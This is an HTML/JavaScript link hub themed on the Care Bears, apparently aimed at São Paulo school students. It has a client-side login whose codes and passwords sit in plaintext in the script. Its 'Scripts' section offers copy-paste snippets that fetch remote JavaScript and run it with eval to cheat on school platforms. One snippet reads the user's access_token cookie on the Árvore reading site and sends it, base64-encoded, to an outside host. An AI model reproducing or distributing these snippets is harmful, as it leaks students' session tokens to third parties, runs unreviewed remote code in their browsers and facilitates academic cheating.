<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Os Ursinhos Carinhosos</title>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
<style>
  :root{
    --bg:#0d1117; --card:#161b22; --primary:#58a6ff; --muted:#8b949e; --radius:12px; --tile-bg:#21262d;
  }
  *{box-sizing:border-box}
  body{font-family:Inter,system-ui,-apple-system,Arial,sans-serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:#c9d1d9;overflow-x:hidden}
  .card{background:var(--card);padding:24px;border-radius:var(--radius);box-shadow:0 8px 30px rgba(0,0,0,.5);width:420px;max-width:95%}
  h2{margin:0 0 12px 0;font-size:20px;color:#f0f6fc}
  label{display:block;font-size:13px;margin:10px 0 6px 0;color:var(--muted)}
  input{width:100%;padding:10px;border-radius:10px;border:1px solid #30363d;background:transparent;color:#f0f6fc}
  .row{display:flex;gap:8px;margin-top:14px}
  button{padding:10px 12px;border-radius:10px;border:0;cursor:pointer;background:var(--primary);color:white}
  .msg{margin-top:12px;font-size:13px;color:#ff7b72;min-height:18px}
  .small{font-size:12px;color:var(--muted);margin-top:8px}
  #central{display:none;width:95%;max-width:1200px;margin:24px auto}
  .central-wrap{Padding:18px; position:relative}
  .central-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
  /* PROFILE FIXADO NO CANTO SUPERIOR ESQUERDO (bem colado na borda) */
  .user-profile{
    position:fixed;
    top:4px;      /* ajuste aqui para "descolar" mais da borda */
    left:4px;     /* ajuste aqui para "descolar" mais da borda */
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:4px;
    color:#f0f6fc;
    z-index:10001;
    pointer-events:none;
  }
  .user-profile img{width:44px;height:44px;border-radius:50%;border:2px solid var(--primary);background:#0b0f14;display:block}
  .user-profile span{font-size:11px; color:#c9d1d9; margin-top:-2px; text-align:center; display:block; pointer-events:auto}
  .sections{display:flex;flex-direction:column;gap:18px}
  .section{background:var(--card);border-radius:12px;padding:14px;box-shadow:0 6px 18px rgba(0,0,0,.3)}
  .section h3{margin:0 0 10px 0;color:#f0f6fc}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
  .tile{display:flex;gap:10px;align-items:center;padding:10px;border-radius:10px;cursor:pointer;transition:transform .12s ease;background:var(--tile-bg);border:1px solid #30363d}
  .tile:hover{transform:translateY(-4px);background:#2b303a}
  .tile[aria-disabled="true"]{opacity:0.5;cursor:not-allowed;transform:none}
  .icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-size:18px}
  .icon img{width:28px;height:28px;border-radius:6px;display:block}
  .meta{display:flex;flex-direction:column}
  .title{font-size:14px}
  .subtitle{font-size:12px;color:var(--muted)}
  .logout{background:#161b22;color:var(--primary);padding:8px 10px;border-radius:10px;border:0;cursor:pointer;pointer-events:auto}
  footer.app-info{margin-top:8px;font-size:12px;color:var(--muted);text-align:right}

  @media (max-width:800px){ .card{width:360px} }
  @media (max-width:600px){ 
    body{align-items:flex-start}
    .card{padding:16px;width:100%;max-width:720px}
    #central{margin:12px}
    .grid{grid-template-columns:repeat(2,1fr)} 
    .user-profile{left:8px;top:8px}
    .user-profile img{width:40px;height:40px}
  }
  @media (max-width:420px){ 
    .card{padding:12px}
    .grid{grid-template-columns:repeat(1,1fr)}
    .tile{padding:12px}
    .title{font-size:15px}
    .icon img{width:36px;height:36px}
    #playButton{width:56px;height:56px;right:14px;bottom:14px}
  }

  /* Play button (hidden at√© login) */
  #playButton{
    position:fixed; bottom:20px; right:20px; width:64px; height:64px;
    border-radius:50%; background:var(--primary); border:none; cursor:pointer;
    z-index:9999; display:none; align-items:center; justify-content:center; font-size:26px; color:white;
    box-shadow: 0 6px 18px rgba(88,166,255,0.22);
  }

  /* toast top-right */
  #toast{
    position:fixed; top:20px; right:20px; background:var(--primary); color:white; padding:10px 16px; border-radius:8px;
    opacity:0; transform:translateY(-6px); transition:opacity .25s, transform .25s; z-index:10000; pointer-events:none;
  }

  /* money */
  .money{position:fixed; top:-60px; font-size:20px; z-index:500; animation:fall linear infinite; will-change: transform, opacity;}
  @keyframes fall{0%{transform:translateY(-50px) rotate(0deg); opacity:1}100%{transform:translateY(110vh) rotate(360deg); opacity:.95}}

  /* hidden, offscreen player container (YouTube) */
  #yt-player { width:0; height:0; overflow:hidden; position:fixed; left:-9999px; top:auto; }

  /* Chat UI */
  .chat-open-btn{
    position:fixed; bottom:100px; right:20px; z-index:10002; padding:10px 14px; border-radius:12px; border:0; cursor:pointer;
    background:linear-gradient(180deg,var(--primary),#2d7fdc); color:white; box-shadow:0 6px 18px rgba(0,0,0,.4);
  }
  .chat-box{
    position:fixed; bottom:20px; right:20px; width:320px; max-width:90%; height:420px; background:var(--card); border-radius:12px; z-index:10003; display:flex; flex-direction:column; box-shadow:0 12px 40px rgba(0,0,0,.6);
  }
  .chat-header{padding:10px 12px; border-bottom:1px solid #232628; display:flex; justify-content:space-between; align-items:center}
  .chat-messages{flex:1; padding:12px; overflow:auto;}
  .chat-message{margin-bottom:10px; font-size:13px}
  .chat-message.me{text-align:right}
  .chat-input{display:flex; gap:8px; padding:10px; border-top:1px solid #232628}
  .chat-input input{flex:1; padding:8px;border-radius:8px;border:1px solid #30363d;background:transparent;color:#f0f6fc}
  .chat-close{background:transparent;border:0;color:var(--muted);cursor:pointer}
  .chat-small{font-size:11px;color:var(--muted);margin-top:6px;text-align:center}
</style>
</head>
<body>

<!-- PERFIL FIXO (fora da central) -->
<div class="user-profile" id="userProfile" style="display:none;">
  <img id="userImg" src="" alt="Ursinho">
  <span id="userName"></span>
</div>

<!-- login -->
<main id="main-login" class="card" aria-labelledby="titulo">
  <h2 id="titulo">Entrar na Central</h2>
  <label for="code">C√≥digo</label>
  <input id="code" type="text" autocomplete="off" />
  <label for="senha">Senha</label>
  <input id="senha" type="password" autocomplete="off" />
  <div class="row">
    <button id="loginBtn">Entrar</button>
    <button id="showBtn" type="button">Mostrar</button>
  </div>
  <div class="msg" id="msg"></div>
  <div class="small">Quem √© o seu Ursinho Carinhoso favorito e por qu√™?</div>
</main>

<!-- central -->
<section id="central">
  <div class="central-wrap">
    <div class="central-header">
      <div>
        <h2 style="margin:0 0 4px 0">Central de Links</h2>
        <div style="font-size:13px;color:var(--muted)">Clique em um item para abrir ou copiar.</div>
      </div>
      <div>
        <button id="logoutBtn" class="logout">Sair</button>
      </div>
    </div>
    <footer class="app-info">v1.21.101.1 ‚Ä¢ Criador: Good Luck Bear</footer>
    <div class="sections" id="sectionsContainer"></div>
  </div>
</section>

<!-- toast + YouTube player + play -->
<div id="toast">Conte√∫do copiado!</div>

<!-- YouTube player container (oculto) -->
<div id="yt-player"></div>

<button id="playButton" aria-pressed="false" aria-label="Tocar m√∫sica">‚ñ∂</button>

<!-- tile template -->
<template id="tileTemplate">
  <div class="tile" tabindex="0">
    <div class="icon"></div>
    <div class="meta">
      <div class="title"></div>
      <div class="subtitle"></div>
    </div>
  </div>
</template>

<!-- Chat UI elements (ser√£o adicionados dinamicamente) -->

<script>
/* ====== ELEMENTS ====== */
const codeInput = document.getElementById('code');
const passInput = document.getElementById('senha');
const loginBtn = document.getElementById('loginBtn');
const msg = document.getElementById('msg');
const showBtn = document.getElementById('showBtn');
const mainLogin = document.getElementById('main-login');
const central = document.getElementById('central');
const sectionsContainer = document.getElementById('sectionsContainer');
const tileTemplate = document.getElementById('tileTemplate');
const logoutBtn = document.getElementById('logoutBtn');
const playBtn = document.getElementById('playButton');
const toast = document.getElementById('toast');
const userNameEl = document.getElementById('userName');
const userImgEl = document.getElementById('userImg');
const userProfileEl = document.getElementById('userProfile');

let currentUrsinho = null;

/* ====== URSINHOS (C√ìDIGO + SENHA + NOME + IMAGENS OFICIAIS + FALLBACK) ====== */
const ursinhos = [
  { 
    "name": "Good Luck Bear", 
    "code": "1093", 
    "pass": "b@123",
    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/a/a3/GoodLuck1.png/revision/latest?cb=20190623214203",
    "fallback": "https://i.imgur.com/6W0h0gG.png" 
  },
  { 
    "name": "Love-a-Lot Bear", 
    "code": "1083", 
    "pass": "b25@",
    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/d/dc/Funshine_bear_570x420.jpg/revision/latest?cb=20120723204753",
    "fallback": "https://i.imgur.com/6iZ7fWx.png" 
  },
  { 
    "name": "Funshine Bear", 
    "code": "1132", 
    "pass": "b23@",
    "img": "https://i.pinimg.com/originals/d7/42/1a/d7421a39a328e5a35f5dd11d3fd63b10.jpg",
    "fallback": "https://i.imgur.com/2qlR7oT.png" 
  }
];

let attempts = 0, maxAttempts = 5, lockedUntil = 0;

function updateMessage(text, success=false){
  msg.textContent = text;
  msg.className = success ? 'msg success' : 'msg';
}
function lockFor(seconds){
  lockedUntil = Date.now() + seconds*1000;
  updateMessage(`Muitas tentativas. Tente novamente em ${seconds} segundos.`);
  loginBtn.disabled = true;
  setTimeout(()=>{ loginBtn.disabled = false; updateMessage(''); }, seconds*1000);
}
function checkCredentials(code, password){
  return ursinhos.find(u => u.code === code.trim() && u.pass === password);
}

/* ====== LOGIN ====== */
loginBtn.addEventListener('click', ()=> {
  if(Date.now() < lockedUntil){ updateMessage('Conta temporariamente bloqueada.'); return; }
  const code = codeInput.value, password = passInput.value;
  if(!code || !password){ updateMessage('Preencha c√≥digo e senha.'); return; }
  const ursinho = checkCredentials(code,password);
  if(ursinho){
    updateMessage('Acesso liberado!', true);
    openCentral(ursinho);
  } else{
    attempts++;
    if(attempts >= maxAttempts){ lockFor(15); attempts = 0; }
    else updateMessage(`C√≥digo ou senha incorretos. Tentativas: ${attempts}/${maxAttempts}`);
  }
});
passInput.addEventListener('keypress', e=>{ if(e.key === 'Enter') loginBtn.click(); });
showBtn.addEventListener('click', ()=>{ const t = passInput.type === 'password' ? 'text' : 'password'; passInput.type = t; showBtn.textContent = t === 'text' ? 'Ocultar' : 'Mostrar'; });

/* ====== CENTRAL DATA (ATUALIZADO) ====== */
const centralSections = [
  { id:'apostilas', title:'Apostilas / Livros (4¬∫ Bimestre)', items:[
      { title:'POR/MAT (4¬∫ Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143257/1340145.pdf', icon:'' },
      { title:'HIS/GEO (4¬∫ Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143266/1340446.pdf', icon:'' },
      { title:'F√çS/BIO/QU√ç (4¬∫ Bimestre)', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/143268/1340460.pdf', icon:'' },
  ]},
  { id:'website', title:'Website', items:[
      { title:'Tarefas', subtitle:'Abrir', url:'https://taskitos.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/9c1ba3f2d4e91f3d221d56cb9e4b4e8bd3c2404bcb7b28c0989b35b56759df8c/68747470733a2f2f692e696d6775722e636f6d2f584943736763482e706e67' },
      { title:'Reda√ß√£o (site)', subtitle:'Abrir', url:'https://redacao.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
      { title:'Speak (install)', subtitle:'Abrir', url:'https://speakify.cupiditys.lol/install', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
      { title:'Leia SP', subtitle:'Abrir (√Årvore)', url:'https://leia.cmsphacks.xyz/?cmsphacks.xyz', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
      { title:'Expans√£o Noturna', subtitle:'Abrir', url:'https://crimsonstrauss.xyz/expansao', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
      { title:'GitHub ‚Äî CMSP Hacks', subtitle:'Reposit√≥rio', url:'https://github.com/DarkModde/CMSP-Plataformas-Hacks', icon:'' },
  ]},
  { id:'scripts', title:'Scripts (copiar)', items:[
      { title:'Reda√ß√£o ‚Äî copiar', subtitle:'Clique para copiar o script', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/RedaSP-IA.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
      { title:'Speak ‚Äî copiar', subtitle:'Clique para copiar o script', code:'fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r => r.text()).then(r => eval(r))', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
      { title:'Khan Academy ‚Äî copiar', subtitle:'Clique para copiar o script', code:'fetch(\'https://raw.githubusercontent.com/CrimsonStrauss/Scripts/refs/heads/main/khanlunar.js\').then(t=>t.text()).then(eval)', icon:'' },
      { title:'Leia SP ‚Äî abrir (script)', subtitle:'Script para √Årvore', code:'!function(){if(\'livros.arvore.com.br\'!==location.host)return alert(\'Este script s√≥ funciona no √Årvore!\');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split(%27access_token=%27)[1].split(%27;%27)[0]))}`)}();', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
      { title:'Expans√£o Noturna ‚Äî copiar', subtitle:'Clique para copiar o script', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/ExNoturnoFDS.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
  ]},
  { id:'links', title:'Links & Comunidades', items:[
      { title:'Sala do Futuro (CMSP)', subtitle:'Abrir', url:'https://acervocmsp.educacao.sp.gov.br', icon:'https://play-lh.googleusercontent.com/l6L7nJ8fVp4J6Unx9V_V5iD--FAOW2b6SGrs3p3c_N4q8n2da7qpxiddwKl2HmxZ3Ykd' },
      { title:'Discord ‚Äî servidor 1', subtitle:'Entrar', url:'https://discord.gg/NhuTd37Z', icon:'' },
      { title:'Discord ‚Äî servidor 2', subtitle:'Entrar', url:'https://discord.gg/vTRynvhje', icon:'' },
      { title:'Discord ‚Äî servidor 3', subtitle:'Entrar', url:'https://discord.gg/rnYjkRA8', icon:'' },
      { title:'Tutorial YouTube', subtitle:'Playlist', url:'https://youtube.com/playlist?list=PLmPgXmAk1aVTd6UsfopLMKTAlQ0FXx0IW', icon:'' },
  ]},
  { id:'ia', title:'Intelig√™ncia Artificial', items:[
      { title:'ChatGPT', subtitle:'OpenAI ‚Äî chatbot', url:'https://chat.openai.com', icon:'' },
      { title:'Google Gemini', subtitle:'Gemini ‚Äî Google', url:'https://gemini.google.com', icon:'' },
      { title:'Microsoft Copilot', subtitle:'Copilot ‚Äî Microsoft', url:'https://www.microsoft.com/en-us/copilot', icon:'' },
      { title:'DeepSeek', subtitle:'DeepSeek ‚Äî Into the Unknown', url:'https://www.deepseek.com', icon:'' },
  ]},
  { id:'games', title:'Jogos', items:[
      { title:'Poki', subtitle:'Jogos online', url:'https://poki.com', icon:'' },
      { title:'Friv', subtitle:'Jogos online', url:'https://friv.com', icon:'' },
      { title:'Jogos360', subtitle:'Jogos online', url:'https://www.jogos360.com', icon:'' },
      { title:'Minijogos', subtitle:'Mais op√ß√µes', url:'https://www.minijogos.com.br', icon:'' },
      { title:'Mini-Games (meu projeto)', subtitle:'P√°gina com mini-games', url:'https://omarquinhosf.github.io/Omarquinhosf-Mini-Games/', icon:'' },
  ]},
];
/* ====== RENDER CENTRAL ====== */
function renderCentral(){
  sectionsContainer.innerHTML = '';
  centralSections.forEach(section=>{
    const secEl = document.createElement('div');
    secEl.className = 'section';
    const h = document.createElement('h3'); h.textContent = section.title; secEl.appendChild(h);

    const grid = document.createElement('div'); grid.className = 'grid';
    section.items.forEach(item=>{
      const tpl = tileTemplate.content.cloneNode(true);
      const tile = tpl.querySelector('.tile');
      const icon = tpl.querySelector('.icon');
      const title = tpl.querySelector('.title');
      const subtitle = tpl.querySelector('.subtitle');

      if(item.icon){
        const img = document.createElement('img');
        img.src = item.icon;
        img.alt = item.title;
        img.onerror = () => { if(item.iconFallback) img.src = item.iconFallback; };
        icon.appendChild(img);
      } else {
        // placeholder icon (emoji)
        icon.textContent = item.title && (item.title.toLowerCase().includes('chat') || item.title.toLowerCase().includes('gpt')) ? 'üí¨' :
                            (item.title && (item.title.toLowerCase().includes('pdf') || item.subtitle && item.subtitle.toLowerCase().includes('pdf'))) ? 'üìÑ' :
                            'üîó';
      }

      title.textContent = item.title;
      subtitle.textContent = item.subtitle || '';

      if(item.disabled){
        tile.setAttribute('aria-disabled','true');
      }

      tile.addEventListener('click', async ()=>{
        if(item.disabled){ showToast('Conte√∫do n√£o dispon√≠vel'); return; }
        if(item.url){ window.open(item.url,'_blank','noopener'); return; }
        if(item.code){
          try {
            await navigator.clipboard.writeText(item.code);
            showToast('Script copiado!');
          } catch(err){
            showToast('Erro ao copiar');
          }
          return;
        }
        showToast('Sem a√ß√£o definida');
      });
      tile.addEventListener('keydown', e=>{ if(e.key==='Enter') tile.click(); });
      grid.appendChild(tpl);
    });

    secEl.appendChild(grid);
    sectionsContainer.appendChild(secEl);
  });
}

/* ====== OPEN / LOGOUT ====== */
function openCentral(ursinho){
  currentUrsinho = ursinho;
  mainLogin.style.display = 'none';
  central.style.display = 'block';
  document.body.style.alignItems = 'flex-start';
  renderCentral();
  codeInput.value = ''; passInput.value = ''; updateMessage('');
  // mostra foto e nome do ursinho no canto superior esquerdo (fixo)
  userImgEl.src = ursinho.img;
  userImgEl.alt = ursinho.name;
  // se img principal falhar, tenta fallback
  userImgEl.onerror = () => { if(ursinho.fallback) userImgEl.src = ursinho.fallback; };
  userNameEl.textContent = ursinho.name;
  userProfileEl.style.display = 'flex';
  // mostrar play button
  playBtn.style.display = 'flex';
  playBtn.focus();

  // criar bot√£o de chat (falar com ursinho)
  ensureChatButton();
}

logoutBtn.addEventListener('click', ()=>{ 
  currentUrsinho = null;
  central.style.display = 'none'; 
  mainLogin.style.display = 'block'; 
  document.body.style.alignItems='center';
  // limpa perfil
  userImgEl.src = ''; userNameEl.textContent = ''; userProfileEl.style.display = 'none';
  // pause no player ao sair
  try { if(typeof player !== 'undefined' && player && player.pauseVideo) player.pauseVideo(); } catch(e){}
  stopRain();
  setPlayIcon(false);
  playBtn.style.display = 'none';
  // remove chat UI se existir
  removeChatUI();
});
document.addEventListener('keydown', e=>{ if(e.key==='Escape' && central.style.display==='block') logoutBtn.click(); });

/* ====== TOAST ====== */
let toastTimeout = null;
function showToast(text, ms = 1500){
  toast.textContent = text;
  toast.style.opacity = '1';
  toast.style.transform = 'translateY(0)';
  if(toastTimeout) clearTimeout(toastTimeout);
  toastTimeout = setTimeout(()=>{ toast.style.opacity = '0'; toast.style.transform = 'translateY(-6px)'; }, ms);
}

/* ====== RAIN ====== */
let raining = false;
let rainElements = [];

function createMoneyElement(){
  const span = document.createElement('span');
  span.className = 'money';
  span.textContent = 'üí∏';
  span.style.left = (Math.random() * 100) + 'vw';
  span.style.fontSize = (14 + Math.random()*18) + 'px';
  span.style.animationDuration = (4 + Math.random()*5) + 's';
  span.style.opacity = (0.6 + Math.random()*0.4);
  span.dataset.rain = '1';
  return span;
}

function startRain(count = 30){
  if(raining) return;
  raining = true;
  for(let i=0;i<count;i++){
    const el = createMoneyElement();
    document.body.appendChild(el);
    rainElements.push(el);
  }
}

function stopRain(){
  raining = false;
  while(rainElements.length){
    const el = rainElements.pop();
    if(el && el.parentNode) el.parentNode.removeChild(el);
  }
}

/* ====== YOUTUBE IFRAME PLAYER ====== */
let player = null;
let ytReady = false;
const VIDEO_ID = 'WrLUqugWEyU';
let playerLoadedTimeout = null;

function setPlayIcon(isPlaying){
  playBtn.textContent = isPlaying ? '‚è∏' : '‚ñ∂';
  playBtn.setAttribute('aria-pressed', String(!!isPlaying));
  playBtn.title = isPlaying ? 'Pausar m√∫sica' : 'Tocar m√∫sica';
}

(function loadYouTubeAPI(){
  if(window.YT && window.YT.Player){ return onYouTubeApiReady(); }
  const tag = document.createElement('script');
  tag.src = "https://www.youtube.com/iframe_api";
  const firstScriptTag = document.getElementsByTagName('script')[0];
  firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
})();

function onYouTubeApiReady(){
  player = new YT.Player('yt-player', {
    height: '0', width: '0',
    videoId: VIDEO_ID,
    playerVars: { autoplay:0, controls:0, rel:0, modestbranding:1, enablejsapi:1, iv_load_policy:3, playsinline:1 },
    events: {
      onReady: (e) => { ytReady=true; setPlayIcon(false); playBtn.disabled=false; showToast('Player pronto',900); },
      onStateChange: (e) => { if(e.data===YT.PlayerState.PLAYING){ setPlayIcon(true); startRain(); } else { setPlayIcon(false); stopRain(); } },
      onError: (e)=>{ console.error('YouTube player error', e); showToast('Erro no player do YouTube'); }
    }
  });
  if(playerLoadedTimeout) clearTimeout(playerLoadedTimeout);
  playerLoadedTimeout = setTimeout(()=>{
    if(!ytReady){ playBtn.disabled=false; showToast('API do YouTube demorou a responder. Tente clicar no bot√£o.',2500); }
  },5000);
}

playBtn.addEventListener('click', () => {
  if(!ytReady || !player){ showToast('Player ainda carregando...'); if(window.onYouTubeIframeAPIReady) try{ window.onYouTubeIframeAPIReady(); } catch(e){}; return; }
  const state = player.getPlayerState();
  if(state !== YT.PlayerState.PLAYING){ try { player.playVideo(); } catch(err){ console.error('Erro ao playVideo()', err); showToast('Falha ao iniciar reprodu√ß√£o'); } }
  else { try { player.pauseVideo(); } catch(err){ console.error(err); showToast('Falha ao pausar'); } }
});
playBtn.addEventListener('keydown', e=>{ if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); playBtn.click(); } });

window.addEventListener('beforeunload', ()=> { try { if(player && player.pauseVideo) player.pauseVideo(); } catch(e){}; stopRain(); });

setPlayIcon(false);
playBtn.disabled = true;
window.onYouTubeIframeAPIReady = function(){ onYouTubeApiReady(); };

/* ====== CHAT: PROVA DE CONCEITO (LOCAL) ====== */
/* Essa implementa√ß√£o cria um bot√£o "Falar com <Ursinho>" e uma caixa de chat local.
   O bot usa respostas pr√©-definidas por persona e regras simples de keyword.
   Se quiser integrar com uma API real (ChatGPT / Gemini), eu posso te ajudar depois. */

const personaResponses = {
  "Good Luck Bear":[
    "Boa sorte! üåü Em que posso te ajudar hoje?",
    "Lembre-se: um pouco de positividade muda muito as coisas!",
    "Quer um conselho r√°pido pra uma prova? Respire fundo e revise os pontos principais."
  ],
  "Love-a-Lot Bear":[
    "Amor e carinho! ‚ù§Ô∏è Como posso te ajudar, amigx?",
    "Um abra√ßo virtual funciona bem. Quer ouvir uma dica de reda√ß√£o?",
    "Lembre-se de tratar os amigos com cuidado e ouvir o outro."
  ],
  "Funshine Bear":[
    "Vamos nos divertir! ‚òÄÔ∏è O que voc√™ quer jogar?",
    "Uma piada r√°pida: Por que o teclado foi ao m√©dico? Porque estava com muitas teclas presas!",
    "Adoro energia positiva ‚Äî conta uma coisa boa que aconteceu hoje!"
  ],
  "default":[
    "Oi! Como posso ajudar?",
    "Desculpa, ainda estou aprendendo a responder isso. Tente perguntar algo simples.",
    "Posso abrir links, copiar scripts e conversar um pouco!"
  ]
};

function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

let chatOpenBtn = null;
let chatBox = null;

function ensureChatButton(){
  if(chatOpenBtn) return;
  chatOpenBtn = document.createElement('button');
  chatOpenBtn.className = 'chat-open-btn';
  chatOpenBtn.type = 'button';
  chatOpenBtn.textContent = `Falar com ${currentUrsinho ? currentUrsinho.name : 'Ursinho'}`;
  chatOpenBtn.addEventListener('click', ()=> openChatBox());
  document.body.appendChild(chatOpenBtn);
}

function removeChatUI(){
  if(chatOpenBtn && chatOpenBtn.parentNode) chatOpenBtn.parentNode.removeChild(chatOpenBtn);
  chatOpenBtn = null;
  if(chatBox && chatBox.parentNode) chatBox.parentNode.removeChild(chatBox);
  chatBox = null;
}

function openChatBox(){
  if(chatBox) return; // j√° aberto
  chatBox = document.createElement('div');
  chatBox.className = 'chat-box';

  const header = document.createElement('div');
  header.className = 'chat-header';
  const title = document.createElement('div');
  title.textContent = currentUrsinho ? `${currentUrsinho.name}` : 'Ursinho';
  const closeBtn = document.createElement('button');
  closeBtn.className = 'chat-close';
  closeBtn.textContent = '‚úï';
  closeBtn.title = 'Fechar chat';
  closeBtn.addEventListener('click', ()=> { if(chatBox && chatBox.parentNode) chatBox.parentNode.removeChild(chatBox); chatBox = null; });
  header.appendChild(title); header.appendChild(closeBtn);

  const messages = document.createElement('div');
  messages.className = 'chat-messages';
  const helper = document.createElement('div');
  helper.className = 'chat-small';
  helper.textContent = 'Conversa local (offline). Mensagens n√£o s√£o enviadas a servidores.';
  messages.appendChild(helper);

  const inputWrap = document.createElement('div');
  inputWrap.className = 'chat-input';
  const input = document.createElement('input');
  input.type = 'text';
  input.placeholder = 'Escreva sua mensagem...';
  const sendBtn = document.createElement('button');
  sendBtn.textContent = 'Enviar';
  sendBtn.addEventListener('click', ()=> { sendMessage(input.value.trim()); input.value=''; input.focus(); });
  input.addEventListener('keypress', e=>{ if(e.key==='Enter'){ sendBtn.click(); }});
  inputWrap.appendChild(input); inputWrap.appendChild(sendBtn);

  chatBox.appendChild(header); chatBox.appendChild(messages); chatBox.appendChild(inputWrap);
  document.body.appendChild(chatBox);
  input.focus();

  function appendMessage(text, fromMe=false){
    const m = document.createElement('div');
    m.className = 'chat-message ' + (fromMe ? 'me':'bot');
    m.textContent = (fromMe ? 'Voc√™: ' : `${currentUrsinho ? currentUrsinho.name : 'Ursinho'}: `) + text;
    messages.appendChild(m);
    messages.scrollTop = messages.scrollHeight;
  }

  function sendMessage(text){
    if(!text) return;
    appendMessage(text,true);
    // resposta do bot (simples)
    setTimeout(()=>{
      const persona = (currentUrsinho && personaResponses[currentUrsinho.name]) ? personaResponses[currentUrsinho.name] : personaResponses.default;
      // regras simples por keyword
      const t = text.toLowerCase();
      let reply = null;
      if(t.includes('oi') || t.includes('ol√°') || t.includes('eae')) reply = `Oi! ${rand(persona)}`;
      else if(t.includes('jogo') || t.includes('jogar')) reply = `Que tal um jogo no Poki? Abra a se√ß√£o "Jogos" pra ver links.`;
      else if(t.includes('ajuda') || t.includes('prova') || t.includes('estudar')) reply = `Respire fundo e divida o estudo em blocos de 25 minutos. Precisa de uma dica espec√≠fica?`;
      else if(t.includes('piada') || t.includes('brincar')) reply = rand(persona);
      else reply = rand(persona);
      appendMessage(reply,false);
    }, 600 + Math.random()*900);
  }

  // expose sendMessage for button closure
  chatBox.sendMessage = sendMessage;
}

/* ====== Inicializa√ß√£o: mant√©m compatibilidade com o c√≥digo existente ====== */
setPlayIcon(false);
playBtn.disabled = true;
</script>
</body>
</html>
